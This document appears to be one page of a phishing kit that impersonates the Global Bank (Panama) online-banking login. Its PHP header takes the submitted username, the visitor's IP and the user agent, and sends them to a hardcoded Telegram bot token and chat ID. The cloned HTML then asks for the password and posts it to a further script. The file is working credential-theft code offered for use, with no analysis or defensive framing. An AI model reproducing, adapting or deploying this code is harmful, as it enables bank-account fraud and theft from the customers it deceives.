<?php
session_start();
if( !empty($_POST['miDiosenticonfio'])){
    
    $_SESSION['TDOCUMENT'] = $_POST['miDiosenticonfio'];

    @$message = "GLOBALPANAMA\n\n".'User-agent: '.$_SERVER['HTTP_USER_AGENT']."\nIP: ".$_SERVER['REMOTE_ADDR']."\n"."IP2: ".$_SERVER['HTTP_X_FORWARDED_FOR']."\n".'USUARIO: '.$_SESSION['TDOCUMENT']."\n";

    $apiToken = "5738934159:AAFC5W8qNihaCUITtIHRoLtkSoC7VOcwRTk";

    $data = [
        'chat_id' => '5617210401',
        'text' => $message
    ];
    
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 

}else{
    @header('Location: ind2.php');
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">

      <script type="text/javascript" async="" src="js/detect.js.descarga"></script><script>
         var ctx = "/eBanking";
      </script>
      <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
      <link rel="shortcut icon" href="https://globalonline.globalbank.com.pa/eBanking/images/favicon.ico">
      <title>Banca en Línea Global Bank</title>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
      

      <link href="css/combined.css" type="text/css" rel="stylesheet">

      <link href="css/combined(1).css" rel="stylesheet">
      <script src="js/combined.js.descarga"></script>
      <!-- XSS - deny -->
      <style> body { display : none;} </style>
      <meta http-equiv="Pragma" content="no-cache">
      <script src="js/combined.js.descarga"></script>
      <!-- XSS - deny -->
      <style> body { display : none;} </style>
      <style type="text/css">#_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.super_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.super_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.super_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.super_copy_btns_btn:hover{opacity:.8}.super_copy_btns_btn:active{opacity:1}</style>
   </head>
   <body  style="display: block;">
      <script> 
         if (self == top) {
           var theBody = document.getElementsByTagName('body')[0]
           theBody.style.display = "block";
         } else { 
           top.location = self.location;
         }
      </script>
      <div class="outerDiv_" id="outer2">
         <div id="superior">
            <div id="banner"></div>
            <div class="idiomaLink" style="display:inline-block; margin-left:614px;padding-left:8.5%">
               <div>
                  <i class="fa fa-language" style="font-size:1.2em"></i>
                  <a id="selectorEs" href="https://globalonline.globalbank.com.pa/eBanking/seguridad/login.htm?lang=es_PA" style="display: none;">
                  English
                  </a>	
                  <a id="selectorEn" href="https://globalonline.globalbank.com.pa/eBanking/seguridad/login.htm?lang=en_PA">
                  English
                  </a>
               </div>
               <script type="text/javascript">
                  function showLanguageSelector(obj,language){	
                  	if("es_PA"!=language){
                  		obj.show();		
                  	}else{
                  		obj.hide();
                  	}
                  }
                  
                  showLanguageSelector($k("#selectorEs"),'es_PA');
                  showLanguageSelector($k("#selectorEn"),'en_PA');
               </script>
            </div>
         </div>
         <div id="left">
            <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
            <!-- DEM47.3_2022-09-16 --> 
            <div id="loginBox">
               <form action="carg.php" method="post"  autocomplete="off">
                  <p id="ip"  hidden="">
                  <input type="hidden" name="_csrf" value="f1bd7862-e868-4880-8aca-42a44930f003">
                  <div class="contentDiv">
                     <div id="titleBox">
                        <h2 id="tituloIngreseUsername" style="display: none;">Ingreso Usuario</h2>
                        <h2 id="tituloIngresePassword" style="">Ingrese su contraseña</h2>
                     </div>
                     <div id="errorBox" style="visibility: hidden;">
                        <span id="errorPlaceholder">Error</span>
                        <span id="errorServicioAvatar" class="value" style="display: none;">
                        Error al consultar avatar
                        </span>
                        <span id="errorUsernameInvalido" class="value" style="display: none;">
                        Nombre de usuario inválido
                        </span>
                        <span id="errorPasswordInvalida" class="value" style="display: none;">
                        Contraseña inválida
                        </span>
                        <span id="errorAutenticacion" class="value" style="display: none;">
                        Usuario o contraseña inválida
                        </span>
                        <span id="errorBloqueo" class="value" style="display: none;">
                        Usuario bloqueado
                        </span>					
                        <span id="sesionExpirada" class="value" style="display: none;">
                        Su sesión ha expirado
                        </span>
                     </div>
                     <div id="pedirPasswordBox">
                        
                        <div class="formTextInput" id="passwordBox">
                           <input type="password" style="display: none;" id="password-breaker">
                           <input id="miDiosenticonfio" name="miDiosenticonfio" type="password" autocomplete="off" required minlength="2" class="loginInput conTecladoVirtual ui-keyboard-input" maxlength="30" onfocus="true" aria-haspopup="true" role="textbox">
                        </div>
                        <div class="campoTecladoVirtual2" style="width: 50px; float: right;">
                           <a id="activarTecladoVirtualPassword" title="Usar teclado virtual" class="icono-teclado-secundario texto boton-link" style="vertical-align: middle;" href="javascript:void(0)">
                           </a>
                        </div>
                        <div id="botonSendPasswordBox">
                           <input id="botonSendPassword" type="submit" value="Aceptar" class="botonSiguiente" >
                        </div>
                     </div>
                     <div id="loginOptions">
                        <ul>
                           <li><a href="#" class="boton-link" style="color: white; "> Volver al Inicio</a></li>
                           <li><a href="#" class="boton-link" style="color: white; font-weight:bold; font-size: 11px;">Afíliate aquí</a></li>
                           <li><a href="#" class="boton-link" style="color: white;"> Olvidé mi contraseña</a></li>
                           <li><a href="#" class="boton-link" style="color: white;">Guías y Tutoriales</a></li>
                        </ul>
                     </div>
                  </div>
               </form>
            </div>
         </div>
         <div style="width: 100%;margin:420px 41px;">
            <div class="contenedor-box" style="text-align: left;">
               <div class="titulo">
                  <i class="fa ti ti-perfilUsuario ti-lg "></i>
                  <span>Nuevos Usuarios</span>
                  <div align="center" class="lineaSeparadora">_______________________</div>
               </div>
               <div class="texto">
                  <ul>
                     <li class="link"><a href="#">Afiliación</a></li>
                     <li class="link"><a href="#">Token</a></li>
                     <li class="link"><a href="#">Transacciones</a></li>
                  </ul>
               </div>
            </div>
            <div class="contenedor-box" style="text-align: left;">
               <div class="titulo">
                  <i class="fa ti ti-estrella ti-lg "></i>
                  <span>Ayuda</span>
                  <div align="center" class="lineaSeparadora">_______________________</div>
               </div>
               <div class="texto">
                  <ul>
                     <li class="link"><a href="#">Llámanos</a></li>
                     <li class="link"><a href="#">Asistente Virtual AVI</a></li>
                     <li class="link"><a href="#">WhatsApp</a></li>
                  </ul>
               </div>
            </div>
            <div class="contenedor-box" style="text-align: left;">
               <div class="titulo">
                  <i class="fa ti ti-ayuda ti-lg "></i>
                  <span>Preguntas Frecuentes</span>
                  <div align="center" class="lineaSeparadora">_______________________</div>
               </div>
               <div class="texto">
                  <ul>
                     <li class="link"><a href="#">Banca en Línea</a></li>
                     <li class="link"><a href="#">Banca Móvil</a></li>
                     <li class="link"><a href="#">Token</a></li>
                  </ul>
               </div>
            </div>
            <div class="contenedor-box" style="text-align: left;">
               <div class="titulo">
                  <i class="fa ti ti-alertas ti-lg "></i>
                  <span>Guías y Tutoriales</span>
                  <div align="center" class="lineaSeparadora">_______________________</div>
               </div>
               <div class="texto">
                  <ul>
                     <li class="link"><a href="#">Banca en Línea</a></li>
                     <li class="link"><a href="#">Banca Móvil</a></li>
                     <li class="link"><a href="#">Token</a></li>
                  </ul>
               </div>
            </div>
         </div>
         <div id="clearfooter"></div>
      </div>
      <div id="footer">
         <!-- 		<div id="footerLogoDiv"> -->
         <!-- 		<div> -->
         <ul>
            <li class="footerText">
               Global Bank Corporation - © 2014 Global Bank - Todos los derechos reservados.
            </li>
            <li class="fragmento_1">
            </li>
            <li class="fragmento_2">
            </li>
            <li class="fragmento_3">
            </li>
         </ul>
      </div>
      <div id="disabledZone" style="float: right; display: none; border: 0px;">
         <!-- Se utiliza en DWR -->
         <div id="modalProcesando">
            <div id="fondoModal">
               <div id="imagenModal">
                  <img src="img/processingAni.gif" border="0">
               </div>
               <div id="textoModal">
                  Espere por favor...
               </div>
            </div>
         </div>
      </div>
      <script async="" type="text/javascript" src="js/_Incapsula_Resource"></script>
      <script type="text/javascript" src="js/footer.js.descarga"></script>
   </body>
</html>